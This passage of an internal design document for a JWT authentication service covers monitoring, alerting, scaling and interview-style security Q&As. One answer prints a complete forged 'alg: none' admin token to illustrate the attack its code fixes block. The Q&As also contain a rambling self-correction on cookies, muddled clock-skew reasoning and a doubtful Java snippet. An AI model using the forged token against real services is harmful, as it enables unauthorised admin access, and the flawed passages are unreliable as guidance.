auth_redis_operation_duration_seconds{operation="blacklist_set|blacklist_check|rate_limit"}

# Gauges
auth_active_sessions_current
auth_jwks_cache_age_seconds
auth_private_key_age_days  // alert when key rotation is due
```

---

### Distributed Traces

OpenTelemetry trace for a login request:

```
login_request [350ms total]
  ├── middleware.rate_limit_check [2ms]
  │     └── redis.GET rl:login:sha256(email) [1ms]
  ├── middleware.cors_check [0.1ms]
  ├── handler.login [348ms]
  │     ├── db.query user_by_email [5ms]
  │     ├── crypto.argon2_verify [295ms]   ← intentionally slow
  │     ├── crypto.jwt_sign [3ms]
  │     ├── crypto.csprng_refresh_token [0.1ms]
  │     ├── db.insert refresh_token [8ms]
  │     └── event.publish audit_log [0.5ms] (async, non-blocking)
  └── middleware.response_headers [0.1ms]
```

Trace IDs propagate to downstream services via `traceparent` header (W3C Trace Context). Resource API logs include the same trace ID, enabling correlation of the login event with subsequent API calls.

---

### Alerting Rules

| Condition | Severity | Action |
|---|---|---|
| `auth_jwt_validations_total{outcome="alg_error"} > 0` | CRITICAL | PagerDuty — algorithm confusion attack attempt |
| `auth_token_refresh_total{reason="reuse_detected"} > 0` | HIGH | PagerDuty — refresh token theft suspected |
| `auth_login_attempts_total{outcome="failure"}` rate > 100/min per email | HIGH | Slack — credential stuffing on specific account |
| `auth_login_attempts_total{outcome="failure"}` rate > 10,000/min globally | CRITICAL | PagerDuty — large-scale credential stuffing |
| `auth_argon2_duration_seconds` p99 > 1s | HIGH | Slack — DoS via long passwords or CPU saturation |
| `auth_db_query_duration_seconds` p99 > 100ms | HIGH | Slack — DB performance degradation |
| `auth_redis_operation_duration_seconds` p99 > 10ms | MEDIUM | Slack — Redis performance issue |
| `auth_private_key_age_days > 30` | MEDIUM | Slack — key rotation overdue |
| `auth_jwks_cache_age_seconds > 86400` | HIGH | Slack — JWKS cache may be stale |
| Normal login traffic during business hours | NO ALERT | Expected pattern |
| Login failures for unknown emails | NO ALERT (unless volumetric) | Normal enumeration probing at low volume |
| Successful logins from new devices | NO ALERT at service level | App-level: send user notification |

---

## 13. Scaling Considerations

### Bottlenecks

**1. Argon2id on the Login Path:**

This is the primary bottleneck by design. Each login consumes 1 CPU core-second and 64MB RAM for ~300ms.

- **Capacity planning**: 1 CPU core can handle ~3 logins/second at 300ms each. A 4-core Auth Service instance handles ~12 logins/second.
- **Scaling strategy**: Horizontal scaling of the Auth Service. 10 instances = 120 logins/second. Autoscale based on CPU utilization (target 60% to maintain headroom).
- **Thread pool isolation**: The Argon2id computation runs in a dedicated thread pool of fixed size. This prevents a login spike from starving other operations (refreshes, logouts, health checks).

**2. PostgreSQL on Write Path:**

Every login writes a refresh token record. Every refresh rotates (deletes old, inserts new). At high volume, writes accumulate.

- **Write scaling ceiling**: Single PostgreSQL primary can handle ~10K writes/second on modern hardware. For most applications, this is not the bottleneck.
- **Read replicas**: User lookups by email (reads) can go to read replicas. Refresh token writes and reads must go to the primary (consistency requirement: no stale read of a just-revoked token).
- **Partitioning**: Partition `refresh_tokens` by `expires_at`. Old partitions (containing expired tokens) can be dropped efficiently instead of running DELETE queries. This also improves query performance on active tokens.

**3. Redis for Blacklist and Rate Limiting:**

- Redis is single-threaded per shard. Can handle ~100K ops/second.
- At extreme scale (millions of concurrent authenticated users + high logout rate), Redis Cluster (sharding) may be needed.
- Blacklist entries are bounded: one per active JWT at logout time. Active JWTs have 15-minute TTL. At 1M concurrent users with 1% logout rate per minute: 10,000 blacklist entries added per minute, each with 15-minute TTL → max ~150,000 entries at any time. Each entry is ~100 bytes. Total: ~15MB. Redis can handle this trivially.

**4. RSA Signing (JWT Issuance):**

- RS256 signing with a 2048-bit RSA key: ~1–5ms per signature on modern hardware.
- This is not a bottleneck at normal scale. At extreme scale (millions of logins/second), consider:
  - Using HSM for signing (offloads to hardware but adds network RTT).
  - Using ECDSA (ES256, ES384) instead of RSA. ECDSA with P-256 is significantly faster than RSA-2048 for signing.

---

### Stateless Validation = Horizontal Scalability

The core scalability advantage of JWT:

```
Traditional session-based system:
  User Request
    │
    ▼
  Session Lookup (Redis, REQUIRED for every request)
    │
    ▼
  Shared Redis cluster (bottleneck, SPOF)
    │
    ▼
  Handle Request

JWT system (no blacklist):
  User Request
    │
    ▼
  JWT Validate (cryptographic, in-process, ~1ms)
    │
    ▼
  Handle Request
  (No shared state required — pure CPU computation)
```

Resource APIs scale horizontally without any shared state dependency for token validation. A new Resource API pod starts and immediately handles JWT-authenticated requests — it doesn't need to synchronize session data from a shared store. It just fetches the JWKS once and validates locally.

**Consistency tradeoffs with stateless JWTs:**

- **Role change**: User's roles in the DB are updated. Their JWT still has old roles until it expires (15 minutes). The application must tolerate this.
- **User deactivation**: User is disabled in the DB. Their JWT is still valid for up to 15 minutes.
- **Password change**: User changes password. All existing JWTs remain valid. To force immediate invalidation, you need a user-level version counter in the JWT (a `version` claim checked against the DB or Redis cache on each request).

```json
{
  "sub": "user-uuid",
  "version": 42,  // incremented on password change, role change, admin forced logout
  ...
}
```

Resource API checks: `redis.get("user_version:" + sub)`. If stored version > JWT version → reject. This reintroduces a per-request Redis dependency but is selective (only users who have had state changes have an entry in Redis).

---

### Horizontal vs. Vertical Scaling Summary

| Component | Vertical Scaling | Horizontal Scaling | Notes |
|---|---|---|---|
| Auth Service | Limited by Argon2id parallelism | YES — stateless; scale freely | Add CPU capacity |
| Resource APIs | YES | YES — fully stateless JWT validation | |
| PostgreSQL | YES (larger instance) | Read replicas for read path | Primary is a bottleneck for writes |
| Redis | YES (more RAM) | Redis Cluster for ops/sec | Blacklist is small; rate limiter is the larger concern |
| RSA signing | Limited by single-threaded CPU | Use HSM cluster or ECDSA | Rarely the actual bottleneck |

---

## 14. Interview Questions

### Q1: Why use RS256 instead of HS256 for JWT signing? What are the security and operational tradeoffs?

**Security:**
RS256 is asymmetric. The private key signs; the public key verifies. Resource APIs only need the public key. If a Resource API is compromised, the attacker cannot forge JWTs — they only have the public key. With HS256, the secret is shared: any service that validates tokens also knows the secret used to sign them. Compromise of any validator = ability to forge arbitrary tokens.

RS256 also enables a clean separation of trust: the Auth Service is the only service that can issue tokens. All other services are consumers that verify but cannot produce.

**Operational:**
RS256 requires a JWKS endpoint (public key distribution), key rotation planning (overlap period), and HSM integration for the private key. HS256 requires secure secret distribution to all services (harder to manage at scale) and secret rotation (requires all services to update simultaneously).

**Performance:**
RSA-2048 signing is slower than HMAC-SHA256 (~3ms vs ~0.1ms). At extreme token issuance rates (millions/second), ECDSA (ES256, P-256) is a better asymmetric alternative — 10–100× faster than RSA for signing.

**What if you must use HS256?** Generate the secret with `secrets.token_bytes(32)` (256-bit). Store in a secrets manager. Rotate every 90 days. Never reuse across environments. This is a fallback when RS256 operational complexity is prohibitive.

---

### Q2: A user changes their password. How do you ensure all existing JWTs are immediately invalidated?

This is fundamentally at odds with stateless JWT validation. Options in increasing security / decreasing scalability order:

**Option A: Do nothing. Accept the window.**
Existing tokens expire in 15 minutes. After a password change, force the user to re-authenticate. All other sessions expire naturally. For most applications, this is acceptable.

**Option B: JTI blacklist.**
On password change, query the DB for all non-expired JTIs issued to this user and add them to the Redis blacklist. Problem: The Auth Service may not have a reliable record of all active JTIs if it doesn't track them. JWTs are stateless — the Auth Service issues them and forgets.

**Option C: User version counter (best practice).**
Add a `version` claim to the JWT:
```json
{"sub": "user-uuid", "version": 42}
```
On password change, atomically increment the user's version in Redis: `INCR user_version:user-uuid`.

Every Resource API request checks: `stored_version = redis.get("user_version:" + sub)`. If `stored_version > jwt.version` → reject with 401.

This is a selective per-request Redis check. Redis entries only exist for users whose version has ever been incremented. Users who have never changed their password have no Redis entry; their requests skip the Redis call (check for entry existence: O(1), typically a cache miss).

**What if Redis is unavailable?** Fail open (accept token) or fail closed (reject all tokens). For high-security systems: fail closed. For high-availability systems: fail open with alerting.

---

### Q3: What is refresh token rotation, and what does "reuse detection" mean? Walk through the attack scenario it prevents.

**Refresh token rotation**: Every time a refresh token is used to get a new access token, the old refresh token is invalidated and a new refresh token is issued. The client must always use the latest refresh token.

**Reuse detection via family tracking**: All refresh tokens in a chain (initial token → first rotation → second rotation → ...) share a `family_id`. When a refresh token is presented:
1. The server looks up the token by hash.
2. If found and not revoked: normal flow — rotate.
3. If found and already revoked: **reuse detected**. This means an attacker stole the old token (before it was rotated) and is trying to use it after the legitimate client already rotated. OR: the legitimate client is replaying an old token (a bug). Either way: revoke ALL tokens with the same `family_id`.

**The attack this prevents:**

1. Attacker steals the victim's refresh token `RT-1` (e.g., via network intercept — unlikely with TLS — or DB dump).
2. Legitimate user uses `RT-1` → server issues `RT-2`, invalidates `RT-1`.
3. Attacker tries to use `RT-1` → server detects: "I have a revoked token in family F." Server revokes all of family F, including `RT-2`.
4. Attacker's access is denied. Victim is forced to re-authenticate.
5. The victim notices they were logged out and can investigate.

**Without family revocation**: The attacker can just use the stolen token before the victim does (a race condition). Whichever party rotates first keeps access. The other party gets a revocation and is logged out — but the first party (potentially the attacker) continues indefinitely.

---

### Q4: What happens to an active JWT if the Auth Service's RSA private key is compromised? What's your incident response?

**What happens:**
An attacker with the private key can generate validly-signed JWTs for any `sub` with any `roles`. All Resource APIs will validate these as legitimate. The attacker has persistent admin access to every service in the system. Existing valid JWTs are also suspect — the attacker may have used the key to generate historical tokens.

**Immediate incident response (minutes):**

1. **Revoke the compromised key at the HSM/KMS level**. New signing operations with that key ID now fail.
2. **Generate a new RSA key pair immediately**.
3. **Remove the compromised key's public key from the JWKS endpoint**. All tokens signed with the old `kid` are now unverifiable — this is a full-service logout for all users.
4. **Force re-authentication for all users**: All existing JWTs have a `kid` pointing to the revoked key. Resource APIs reject them. Users must log in again.
5. **Audit KMS logs**: Determine if and when the key was misused. Identify any unauthorized signing operations.
6. **Rotate all secrets that may have been accessible to the process that had the key**: DB credentials, Redis passwords, any other secrets cached alongside the RSA key.

**Why removing the public key works:**
JWT validation requires the public key. If the JWKS no longer contains `key-old`, validators cannot verify the signature and must reject the token. This is a hard cutover — all users are logged out simultaneously.

**Mitigation for the future:**
- Use an HSM. The raw private key bytes never leave the HSM. Compromise of the signing service only gives the attacker the ability to request signatures — not the key itself.
- Monitor KMS/HSM for anomalous signing rates (1000 signatures/second when the system normally does 10/second = red flag).

---

### Q5: Describe the "confused deputy" problem in the context of multi-service JWT authentication. How does the `aud` claim prevent it?

**Confused deputy**: Service B (the deputy) validates a JWT and acts on it. The JWT was intended for Service A but is presented to B. B has higher privileges than A. B validates the signature (valid) and expiry (not expired) but doesn't check who the token was meant for — so it acts on behalf of the attacker.

**Concrete example:**
- Service A: User profile service. Anyone can call it.
- Service B: Billing service. Only users with `role: billing_admin` can call it.
- Attacker calls Service A, gets a valid JWT: `{"aud": ["service-a"], "roles": ["user"]}`.
- Attacker presents this JWT to Service B.
- Service B validates signature (valid) and exp (not expired). If B doesn't check `aud`, it accepts the token.
- Attacker has accessed the billing service with a token not intended for it.

**`aud` prevents this:**
Service B's validator is configured: `EXPECTED_AUDIENCE = "service-b"`. It checks: `"service-b" in jwt.payload.aud`. The token has `aud: ["service-a"]`. Check fails. Token rejected.

**What if `aud` is a list?** A token can have multiple audiences: `{"aud": ["service-a", "service-b"]}`. The check is: does the service's identifier appear in the list? This allows tokens to be used across multiple services when explicitly intended by the issuer.

**Operational requirement**: Each service must know its own audience identifier at deploy time. This is typically a configuration value. Services must fail to start if this is not configured (prevent misconfigured services from accepting all tokens).

---

### Q6: The `exp` claim has expired, but the clock on the Resource API server is 10 minutes behind. What happens? What are the security implications?

**What happens:**
The server computes `exp - now`. Because `now` is 10 minutes behind real time, tokens that have been expired for up to 10 minutes appear valid. An attacker with a stolen token that expired 9 minutes ago can still use it.

**Security implication:**
The effective token lifetime is `configured_TTL + clock_drift`. If the configured TTL is 15 minutes and the clock is 10 minutes behind, the actual window is 25 minutes. This is a 67% increase in the attacker's window to use a stolen token.

**At scale**: If multiple Resource API instances have varied clock drift (some fast, some slow), token behavior becomes unpredictable. A token accepted by one instance is rejected by another, causing intermittent 401 errors — very hard to debug.

**Mitigation:**
- NTP synchronization with monitoring. Alert if clock drift exceeds 1 second.
- `chrony` (Linux) for NTP — more accurate than `ntpd`. Target drift < 100ms.
- In the validator, apply a maximum acceptable clock skew: `if exp < now - MAX_SKEW: reject`. Set `MAX_SKEW` to 60 seconds. This means if the server's clock is 10 minutes behind, tokens that are genuinely 10 minutes expired are rejected because `exp - (now - 60s) < 0` — the skew tolerance doesn't cover 10 minutes of drift.
- Log and alert when `exp - now` is within the skew window (i.e., token is technically expired but within tolerance). Metric: `auth_jwt_accepted_near_expiry_total`.

---

### Q7: How would you implement "remember me" functionality securely with JWTs?

"Remember me" means maintaining authentication across browser sessions (tab closes, browser restarts) for an extended period (7–30 days).

**Naive (wrong) approach**: Issue a long-lived access token (30 days). Problem: If stolen, the attacker has access for 30 days and no way to revoke without a blacklist.

**Correct approach (layered):**

1. **Standard session**: Access token (15 min) + Refresh token (1 day), stored as described.
2. **"Remember me" token**: A separate, long-lived token (30 days), stored in an `HttpOnly; Secure; SameSite=Strict` cookie with the name `remember_me`.

On login with "remember me" checked:
- Issue a standard refresh token (1 day) and an additional "persistent session token" (30 days).
- Store the persistent session token hash in the DB: `persistent_sessions` table with `user_id`, `token_hash`, `expires_at`, `device_fingerprint`.

On subsequent visits (after browser restart):
- Standard refresh token is expired (1 day). Refresh cookie gone with session close if stored in sessionStorage... wait, cookies persist. Actually, an `HttpOnly` cookie without `max-age` or `expires` is a session cookie (deleted on browser close). To persist across restarts, the cookie must have `max-age` or `expires`.

**Practical implementation:**
- Short-lived refresh token: cookie with no `max-age` (session cookie). Expires on browser close.
- "Remember me" refresh token: cookie with `max-age=2592000` (30 days). Persists across browser restarts.
- Same rotation logic applies. Compromise detection via family-based reuse.

**Risk management for long-lived tokens:**
- Bind to device fingerprint (user agent hash, screen resolution hash, timezone). Soft binding — alert on mismatch, don't hard-reject (user agents change on browser update).
- Absolute expiry: 30 days, non-extendable. Even with continuous activity, must re-authenticate after 30 days.
- Allow users to see and revoke active "remember me" sessions from their account settings.

---

### Q8: What is JWT "none" algorithm, where does it come from, and what's the exact code change needed to prevent it?

**History**: The JWT spec (RFC 7519) explicitly includes `alg: none` as a valid algorithm, defined as "no digital signature or MAC is performed." The intended use case was for cases where the token is transported in an already-authenticated channel (e.g., inside an encrypted JOSE container). It was never intended for use in standalone token validation.

Early JWT library implementations interpreted flexibility as: "accept the algorithm the token claims." This created the vulnerability.

**The attack (recap):**
```
Forged token:
  Header: {"alg":"none","typ":"JWT"}
  Payload: {"sub":"admin","roles":["admin"],"exp":9999999999}
  Signature: (empty string)
  
Full JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGVzIjpbImFkbWluIl0sImV4cCI6OTk5OTk5OTk5OX0.
```

**Exact code fix (per language):**

Python (PyJWT):
```python
# WRONG
jwt.decode(token, public_key)

# CORRECT
jwt.decode(token, public_key, algorithms=["RS256"])
# PyJWT >= 2.0: algorithms parameter is REQUIRED, raises DecodeError if not provided
```

Node.js (jsonwebtoken):
```javascript
// WRONG
jwt.verify(token, publicKey);

// CORRECT
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

Go (golang-jwt/jwt):
```go
// WRONG — uses header alg
token, _ := jwt.Parse(tokenString, keyFunc)

// CORRECT — uses ParseWithClaims with explicit algorithm constraint
token, err := jwt.ParseWithClaims(tokenString, &Claims{}, keyFunc, jwt.WithValidMethods([]string{"RS256"}))
```

Java (jjwt):
```java
// WRONG
Jwts.parserBuilder().setSigningKey(publicKey).build().parseClaimsJws(token);

// CORRECT — jjwt requires algorithm specification as of 0.12.x
Jwts.parserBuilder()
    .require(JwsHeader.ALGORITHM, SignatureAlgorithm.RS256.getValue())
    .setSigningKey(publicKey)
    .build()
    .parseClaimsJws(token);
```

**Additional defense**: In the `keyFunc` callback (used by many libraries to select the verification key), validate the `alg` before returning the key:
```go
keyFunc := func(token *jwt.Token) (interface{}, error) {
    if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
        return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
    }
    return getPublicKey(token.Header["kid"])
}
```

---

### Q9: A Resource API needs to check if the user's account has been disabled after their JWT was issued, without making a DB call on every request. How do you design this?

**The problem**: JWTs are stateless. The `is_active` flag lives in the DB. If it changes, the JWT doesn't know.

**Options in order of complexity and consistency:**

**Option A: Accept the window (15-minute maximum).**
Disable the user. Their JWT expires in ≤15 minutes. They can make API calls for up to 15 minutes. For most use cases (terminated employee, spam account), this is acceptable. Simple; no additional infrastructure.

**Option B: Redis user version / status cache (recommended).**
Maintain a Redis set or hash for disabled users:
```
Key:   "user_disabled:" + user_id
Value: "1"
TTL:   JWT_MAX_LIFETIME (15 minutes)
```

On account disable: `redis.setex("user_disabled:" + user_id, 900, "1")`.

Resource API middleware (added after JWT validation):
```python
if redis.exists("user_disabled:" + jwt.sub):
    return 401, "Account disabled"
```

Redis check: O(1), ~0.5ms. Only users who have been disabled have an entry. Cache entries auto-expire after 15 minutes (by which time all their JWTs have also expired).

**Trade-off**: Adds Redis dependency to the Resource API's request path. If Redis is unavailable: fail open (accept the token — security risk) or fail closed (reject all tokens — availability risk). For disability checks, failing open is typically acceptable: the 15-minute window already exists; a brief Redis outage doesn't significantly increase risk.

**Option C: Short-lived token approach (architectural).**
Reduce access token TTL to 1–2 minutes. The increased refresh token usage adds load to the Auth Service (which CAN check `is_active` on refresh), but validation windows become very short. Trades Auth Service load for tighter consistency.

---

### Q10: How do you securely implement password reset with a JWT-based auth system?

Password reset involves issuing a single-use, short-lived token that proves the user owns the email address.

**Flow:**

1. User POSTs their email to `/auth/password/reset`.
2. Auth Service:
   a. Looks up the user by email. If not found: return 200 anyway (prevents email enumeration — always pretend to succeed).
   b. Generates a reset token: `token = base64url(CSPRNG(32 bytes))`.
   c. Stores: `SHA-256(token)` in DB with `user_id`, `expires_at` (15 minutes), `used=false`.
   d. Sends email with link: `https://app.example.com/reset-password?token=<token>`.
3. User clicks the link. Frontend POSTs to `/auth/password/reset/confirm`:
   ```json
   {"token": "<token>", "new_password": "new-secure-password"}
   ```
4. Auth Service:
   a. Computes `SHA-256(token)`.
   b. Looks up in DB. Validates: exists, not expired, not used.
   c. Sets `used=true` (atomically — no TOCTOU).
   d. Updates `password_hash` for the user.
   e. Invalidates ALL existing refresh tokens for the user (set `revoked_at` for all active tokens in the family).
   f. Increments user version in Redis (invalidates all active JWTs immediately).
   g. Returns 200. Does NOT issue a new JWT (user must login fresh).

**Why NOT use a JWT as the reset token:**
- JWTs cannot be single-use without a database check (statefulness). If you're checking the DB anyway, a random token is simpler.
- JWTs are larger (600 bytes) — ugly URLs.
- JWTs have a `jti` blacklist complexity. A DB-backed token is cleaner.

**Security properties:**
- Opaque token (not a JWT). No information leakage.
- Single-use enforced by `used=true` update.
- Short TTL (15 minutes).
- Only the hash stored in DB.
- All existing sessions invalidated on successful reset.
- Rate limit `/auth/password/reset`: 3 requests per hour per email.

---

### Q11: What is the difference between authentication and authorization in the JWT context, and how does JWT handle each?

**Authentication**: Proving identity. "Who are you?" The answer is the `sub` claim — a stable, unique identifier for the entity.

**Authorization**: Determining permissions. "What are you allowed to do?" The answer is embedded in `roles`, `scope`, `permissions` claims.

**How JWT handles authentication:**
The JWT is issued by the Auth Service after the user proves their identity (password, MFA, OAuth, etc.). The `sub` claim is set to the user's internal ID. Any service that receives this JWT knows with cryptographic certainty (via the RS256 signature) that the Auth Service vouched for this user's identity at `iat` time. The service doesn't need to re-verify the identity.

**How JWT handles authorization:**
The `roles` and `scope` claims encode what the user is allowed to do. The Resource API reads these claims and enforces access:
```python
if "admin" not in jwt.roles and request.path.startswith("/admin"):
    return 403
```

**The fundamental tension:**
Authorization state (roles, permissions) changes over time. A user promoted to admin gets a new role in the DB. Their JWT still has `roles: ["user"]` for up to 15 minutes. The JWT is a snapshot of authorization state at issuance time.

**Two mental models:**
1. **JWT as a capability document**: The token IS the permission. Whatever is in it, the bearer has. Simple, fast.
2. **JWT as an identity assertion**: The `sub` is trusted; authorization is re-checked at the resource layer against current DB state. More accurate, but adds DB calls.

Most systems use a hybrid: roles in the JWT for common cases (fast path), with per-request authorization checks for sensitive operations (admin endpoints always verify DB state). This balances performance and consistency.

---

### Q12: Your JWT validation at a Resource API is taking 50ms instead of the expected 1–2ms. What are the possible causes and how do you diagnose each?

Expected RS256 verification: 0.5–2ms (pure CPU: RSA public key operation).

**Possible causes:**

**1. RSA key size too large (4096-bit instead of 2048-bit).**
RSA verification time scales with key size. 4096-bit is ~4× slower than 2048-bit for verification. Diagnosis: Log key size in startup metrics. Fix: Use 2048-bit RSA (secure) or switch to ECDSA P-256 (ES256, ~10× faster than RSA-2048 for verification).

**2. JWKS being fetched on every request (no caching).**
If the JWKS cache is not implemented or has a bug causing it to expire immediately, every JWT validation triggers an HTTP call to `/.well-known/jwks.json`. An HTTP request to an internal service typically takes 5–50ms. Diagnosis: Add a counter `jwks_fetch_total` — it should be near zero after startup. Trace the JWT validation span and check for HTTP sub-spans. Fix: Implement JWKS caching with appropriate TTL (6 hours) keyed by `kid`.

**3. Blocking I/O in the validation path (async bug).**
In async frameworks (Node.js, Python asyncio), accidentally calling a synchronous/blocking function in the async validation path blocks the event loop. All concurrent requests queue up. Diagnosis: CPU profiler trace — if the 50ms is CPU time, it's computation. If it's wall time with low CPU usage, it's I/O or lock contention. Fix: Ensure the JWT verification library uses non-blocking APIs; run CPU-intensive work in a thread pool executor.

**4. Redis blacklist check with high latency.**
If the blacklist check Redis is in a different region or experiencing network latency, a 50ms Redis RTT dominates the validation time. Diagnosis: Measure Redis operation latency separately (`redis_operation_duration_seconds` metric). Fix: Ensure Redis is in the same availability zone as the Resource API. Use connection pooling and keepalives.

**5. CPU throttling (cloud instance under contention).**
In a Kubernetes cluster, if the pod's CPU limits are too low, the kernel throttles CPU time. Cryptographic operations (RSA verification) are CPU-intensive — throttling causes them to stretch. Diagnosis: Check `container_cpu_throttled_seconds_total` metric in Kubernetes. Fix: Increase CPU limits or requests for the Resource API pod.

**6. JWT library parsing inefficiency (JSON parsing of large payloads).**
If the JWT payload is large (many claims, large arrays), JSON parsing adds time. At 50ms for ~1KB of JSON, the library may be using an inefficient parser. Diagnosis: Profile the validation code path — which step is slow? If it's JSON parsing: switch to a faster JSON library (simgo in Go, orjson in Python). Fix: Keep JWT payloads small; include only necessary claims.

---

*Document version: 1.0 | Classification: Internal Engineering | Do not distribute externally*  
*Contains security-sensitive architectural details — handle as confidential*
